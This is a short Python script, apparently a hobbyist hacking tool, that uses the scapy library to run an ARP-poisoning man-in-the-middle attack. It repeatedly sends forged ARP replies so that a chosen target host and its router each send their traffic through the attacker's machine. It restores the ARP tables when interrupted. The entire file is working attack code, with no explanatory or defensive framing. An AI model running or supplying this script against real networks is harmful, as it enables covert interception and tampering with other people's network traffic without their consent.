import scapy.all as scapy
import time
from optparse import OptionParser

def input_option():
    inoption = OptionParser()
    inoption.add_option("-t","--target",dest="target_ip",help="input target ip address")
    inoption.add_option("-r","--router",dest="router_ip",help="input gatewey ip address")
    values=inoption.parse_args()[0]
    if not values.target_ip:
        print("Enter target IP")
    if not values.router_ip:
        print("Enter router IP")
    return values

def get_mac_addr(ip):
    request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    connect = broadcast/request
    answer = scapy.srp(connect,timeout=1,verbose=False)[0]   # come here two packet , firsth -> answer, second -> unanswer 
    return answer[0][1].hwsrc

def arp_poisen(target_ip,router_ip):
    target_mac = get_mac_addr(target_ip)
    response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=router_ip)
    scapy.send(response,verbose=False)

def reset(target_ip,router_ip):
    target_mac=get_mac_addr(target_ip)
    router_mac=get_mac_addr(router_ip)
    response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=router_ip,hwsrc=router_mac)
    scapy.send(response,count=10,verbose=False)

num =0
values = input_option()
print("Welcome MITM")
try:
    while True:
        arp_poisen(values.target_ip,values.router_ip)
        arp_poisen(values.router_ip,values.target_ip)
        time.sleep(2)
        num += 2
        print("\rSend packet  " + str(num),end=" ")
except KeyboardInterrupt:
    print("\nQuit and Reset")
    reset(values.target_ip,values.router_ip)
    reset(values.router_ip,values.target_ip)


#Mr.Akbar


